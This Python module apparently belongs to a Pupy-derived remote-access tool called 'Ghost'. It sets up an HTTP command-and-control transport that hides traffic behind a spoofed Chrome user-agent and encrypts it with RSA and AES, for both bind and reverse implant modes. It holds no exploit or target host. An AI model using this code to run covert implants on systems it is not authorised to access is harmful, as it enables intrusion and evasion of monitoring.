# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Ghost is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from ghost.network.transports import Transport, LAUNCHER_TYPE_BIND
from ghost.network.lib import GhostTCPServer, GhostTCPClient, GhostSocketStream
from ghost.network.lib import GhostHTTPClient, RSA_AESClient
from ghost.network.lib import GhostHTTPServer, RSA_AESServer
from ghost.network.lib import chain_transports

class TransportConf(Transport):
    info = "TCP transport using HTTP with RSA+AES"
    name = "http"
    server = GhostTCPServer
    client = GhostTCPClient
    stream = GhostSocketStream
    credentials = ['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY']
    internal_proxy_impl = ['HTTP']

    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)

        self.client_transport_kwargs.update({
            'host': None
        })

        try:
            import ghost_credentials
            RSA_PUB_KEY = ghost_credentials.SIMPLE_RSA_PUB_KEY
            RSA_PRIV_KEY = ghost_credentials.SIMPLE_RSA_PRIV_KEY

        except ImportError:
            from ghost.ghostlib.GhostCredentials import Credentials
            credentials = Credentials()
            RSA_PUB_KEY = credentials['SIMPLE_RSA_PUB_KEY']
            RSA_PRIV_KEY = credentials['SIMPLE_RSA_PRIV_KEY']

        user_agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) '\
          'Chrome/41.0.2228.0 Safari/537.36'

        if self.launcher_type == LAUNCHER_TYPE_BIND:
            self.client_transport = chain_transports(
                    GhostHTTPClient.custom(keep_alive=True, user_agent=user_agent),
                    RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    GhostHTTPServer.custom(verify_user_agent=user_agent),
                    RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )

        else:
            self.client_transport = chain_transports(
                    GhostHTTPClient.custom(keep_alive=True, user_agent=user_agent),
                    RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256),
                )
            self.server_transport = chain_transports(
                    GhostHTTPServer.custom(verify_user_agent=user_agent),
                    RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256),
                )
